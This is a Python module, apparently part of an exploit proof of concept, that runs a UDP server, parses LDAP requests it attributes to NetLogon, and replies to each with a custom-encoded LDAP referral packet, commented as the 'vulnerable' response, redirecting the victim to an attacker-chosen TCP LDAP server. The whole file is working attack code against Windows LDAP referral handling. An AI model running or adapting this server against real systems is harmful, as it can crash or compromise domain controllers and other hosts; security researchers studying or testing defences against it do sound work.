import socket
from logger import logger
from ldaptor.protocols import pureldap
from ldaptor.protocols import pureber

REFERRAL_RESULT_CODE = 10


class LDAPSearchResultDoneRefferal(pureldap.LDAPSearchResultDone):
    def toWire(self):
        elements = [
            pureber.BEREnumerated(self.resultCode),
            pureber.BEROctetString(self.matchedDN),
            pureber.BEROctetString(self.errorMessage),
        ]

        if self.resultCode == 10:  # LDAP referral result code
            if self.referral:
                elements.append(
                    pureber.BERSequence(
                        [pureber.BEROctetString(url) for url in self.referral],
                        tag=0xA3  # Context-specific tag for referral
                    )
                )

        if self.serverSaslCreds:
            elements.append(pureldap.LDAPBindResponse_serverSaslCreds(self.serverSaslCreds))

        return pureber.BERSequence(elements, tag=self.tag).toWire()


def get_referral_to_tcp_server_ldap_packet(message_id: int, tcp_ldap_url: str) -> bytes:
    """
    Build an LDAP referral response packet.
    """
    ldap_search_result = LDAPSearchResultDoneRefferal(resultCode=REFERRAL_RESULT_CODE, referral=[f'ldap://{tcp_ldap_url}'])
    ldap_response_message = pureldap.LDAPMessage(value=ldap_search_result, id=message_id)
    bytes_to_send = ldap_response_message.toWire()

    return bytes_to_send


def answer_request_with_referral(data: bytes, addr, sock: socket.socket, tcp_ldap_url: str):
    berdecoder = pureldap.LDAPBERDecoderContext_TopLevel(
        inherit=pureldap.LDAPBERDecoderContext_LDAPMessage(
            fallback=pureldap.LDAPBERDecoderContext(
                fallback=pureber.BERDecoderContext()
            ),
            inherit=pureldap.LDAPBERDecoderContext(
                fallback=pureber.BERDecoderContext()
            ),
        )
    )

    # Parse the received data
    ldap_message, _ = pureber.berDecodeObject(berdecoder, data)
    logger.debug(f"Received LDAP request from NetLogon {addr}")

    # Build the "vulnerable" response packet
    referral_ldap_packet = get_referral_to_tcp_server_ldap_packet(ldap_message.id, tcp_ldap_url=tcp_ldap_url)

    logger.debug(f"Sending LDAP referral response packet to {addr}: {referral_ldap_packet}")
    # Send back to client
    sock.sendto(referral_ldap_packet, addr)


def run_server(listen_port: int, tcp_ldap_url: str):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', listen_port))
    logger.debug(f"Server listening on port {listen_port}")

    try:
        while True:
            data, addr = sock.recvfrom(4096)
            answer_request_with_referral(data, addr, sock, tcp_ldap_url)
    except KeyboardInterrupt:
        logger.debug("Server has been shut down.")
    finally:
        sock.close()
